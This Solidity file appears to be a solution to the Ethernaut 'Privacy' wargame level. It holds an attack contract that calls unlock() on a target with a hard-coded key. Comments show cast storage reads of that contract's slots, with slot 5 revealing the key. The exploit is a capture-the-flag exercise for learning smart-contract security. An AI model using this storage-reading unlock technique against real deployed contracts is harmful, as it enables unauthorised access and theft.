// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import { Privacy } from "./Privacy.sol";


contract PrivacyAttack{
    Privacy victim;

    constructor(address _v) {
        victim = Privacy(_v);
    }

    function attack() public {

        victim.unlock(0xfe1967c5ea861bc67a90c38aa38936d4);
    }
}

// @jeremiasz ethernaut % cast storage 0x4bb8C9C796AA15d06A963743dAaAa394945DB299 0 --rpc-url $RPC          
// 0x0000000000000000000000000000000000000000000000000000000000000001
// @jeremiasz ethernaut % cast storage 0x4bb8C9C796AA15d06A963743dAaAa394945DB299 1 --rpc-url $RPC           
// 0x0000000000000000000000000000000000000000000000000000000066bf7990
// @jeremiasz ethernaut % cast storage 0x4bb8C9C796AA15d06A963743dAaAa394945DB299 2 --rpc-url $RPC
// 0x000000000000000000000000000000000000000000000000000000007990ff0a
// @jeremiasz ethernaut % cast storage 0x4bb8C9C796AA15d06A963743dAaAa394945DB299 3 --rpc-url $RPC
// 0x13158c027c190a32fd58bdbecec2310ab3e2090d80aeb505a6bc494177f8924a
// @jeremiasz ethernaut % cast storage 0x4bb8C9C796AA15d06A963743dAaAa394945DB299 4 --rpc-url $RPC
// 0x6b0e840f2aaef1b3b342914fc8b8b5220f857911371307af2c7f2497b7dc32f9
// @jeremiasz ethernaut % cast storage 0x4bb8C9C796AA15d06A963743dAaAa394945DB299 5 --rpc-url $RPC
// 0xfe1967c5ea861bc67a90c38aa38936d47ef9c48f99728e459fee4ce5940f875d
// @jeremiasz ethernaut % cast storage 0x4bb8C9C796AA15d06A963743dAaAa394945DB299 6 --rpc-url $RPC
// 0x0000000000000000000000000000000000000000000000000000000000000000